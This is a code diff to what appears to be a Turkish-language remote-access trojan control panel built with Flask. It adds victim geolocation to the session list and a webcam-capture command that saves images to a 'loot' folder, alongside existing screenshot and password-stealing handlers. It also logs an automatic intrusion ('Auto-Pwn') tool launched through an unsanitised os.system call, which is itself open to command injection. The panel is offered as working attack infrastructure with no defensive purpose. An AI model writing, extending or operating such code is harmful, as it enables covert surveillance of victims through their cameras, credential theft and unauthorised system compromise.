@@ -54,7 +54,8 @@ def sessions():
         sess_list.append({
             "id": sid,
             "ip": sess["addr"][0],
-            "port": sess["addr"][1]
+            "port": sess["addr"][1],
+            "geo": sess.get("geo", {"country": "Bilinmiyor", "city": "Bilinmiyor", "lat": 0, "lon": 0})
         })
     return jsonify({"sessions": sess_list})
 
@@ -114,6 +115,14 @@ def send_command():
                 f.write(img_data)
             return jsonify({"status": "success", "output": f"Ekran goruntusu Ganimetler klasorune kaydedildi: {img_path}"})
             
+        # Handle webcam
+        if cmd == "!webcam":
+            img_data = base64.b64decode(resp)
+            img_path = os.path.join(base_d, "Ganimetler", f"web_webcam_{sid}.jpg")
+            with open(img_path, "wb") as f:
+                f.write(img_data)
+            return jsonify({"status": "success", "output": f"Kamera goruntusu Ganimetler klasorune kaydedildi: {img_path}"})
+            
         # Handle steal_passwords
         if cmd == "!steal_passwords":
             out_path = os.path.join(base_d, "Ganimetler", f"web_passwords_{sid}.txt")
@@ -133,14 +142,21 @@ def autopwn():
         
     def run_pwn():
         try:
-            import Moduller.Oto_Sizma_Araci.Oto_Sizma_Araci as AutoPwn # wait, the path is Moduller.00_Oto_Sizma_Araci.Oto_Sizma_Araci
-            # It's better to just use subprocess
             script = os.path.join(base_d, "Moduller", "00_Oto_Sizma_Araci", "Oto_Sizma_Araci.py")
-            os.system(f"python \"{script}\" {target}")
+            log_file = os.path.join(base_d, "Ganimetler", f"autopwn_{target.replace('.', '_')}.log")
+            os.system(f"python \"{script}\" {target} > \"{log_file}\" 2>&1")
         except: pass
         
     threading.Thread(target=run_pwn, daemon=True).start()
     return jsonify({"status": "success", "message": f"{target} icin Auto-Pwn arka planda baslatildi. Tamamlandiginda telefonunuza bildirim gelecek."})
+
+@app.route("/api/autopwn_logs/<target>")
+def autopwn_logs(target):
+    log_file = os.path.join(base_d, "Ganimetler", f"autopwn_{target.replace('.', '_')}.log")
+    if os.path.exists(log_file):
+        with open(log_file, "r", encoding="utf-8") as f:
+            return jsonify({"status": "success", "log": f.read()})
+    return jsonify({"status": "error", "message": "Log bulunamadi veya tarama henuz baslamadi."})
 
 @app.route("/api/categories")
 def categories():
